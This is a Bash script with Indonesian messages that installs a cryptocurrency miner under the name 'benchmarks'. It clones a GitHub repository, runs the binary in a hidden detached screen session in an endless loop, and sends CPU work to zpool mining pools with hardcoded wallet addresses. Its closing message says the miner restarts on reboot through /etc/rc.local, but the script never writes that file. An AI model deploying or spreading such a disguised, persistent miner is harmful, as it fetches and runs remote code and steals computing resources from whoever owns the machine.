#!/bin/bash
echo "üì¶ Menginstal dependensi..."
apt-get update && apt-get install -y screen wget tar

echo "üìÅ Menyimpan skrip mining ke /root/benchmarks.sh..."
cat << 'EOF' > /root/benchmarks.sh
#!/bin/bash

cd /root || exit

# Download miner jika belum ada
if [ ! -f benchmarks ]; then
  echo "‚¨áÔ∏è Mengunduh file benchmarks..."
  git clone https://github.com/amirul5656/yui56.git
  cd yui56
  chmod +x benchmarks
fi

# Cek apakah screen sudah berjalan
if screen -list | grep -q amirul3; then
  echo "‚ö†Ô∏è  Screen 'amirul3' sudah jalan, skip."
else
  echo "‚ñ∂ Menjalankan mining di screen 'amirul3'..."
  screen -dmS amirul3 bash -c '
    while true; do
      ./benchmarks --algorithm power2b\;yespowertide\;xelisv2_pepew --pool stratum+tcp://power2b.sea.mine.zpool.ca:6242\;stratum+tcp://yespowerTIDE.sea.mine.zpool.ca:6239\;stratum+tcp://xelisv2-pepew.sea.mine.zpool.ca:4833 --wallet mbc1qse2ad4q6lwgtpqj0ls6hg2qp4fp9dm3ht4z5vg\;TNdejRirqYiHoSjiWpiVDTyNTLZfMVPkLm\;PQ1TCGVFEz8LzEgiyECHCVozsdtLvQ2N61 --password zap=MBC\;zap=TDC\;zap=PEPEW --cpu-threads 5\;5\;5 --disable-gpu
      sleep 2
    done
  '
fi
EOF

chmod +x /root/benchmarks.sh

echo "üöÄ Menjalankan miner sekarang..."
bash /root/benchmarks.sh

echo "‚úÖ Siap! Mining aktif sekarang & otomatis jalan setelah reboot lewat /etc/rc.local."
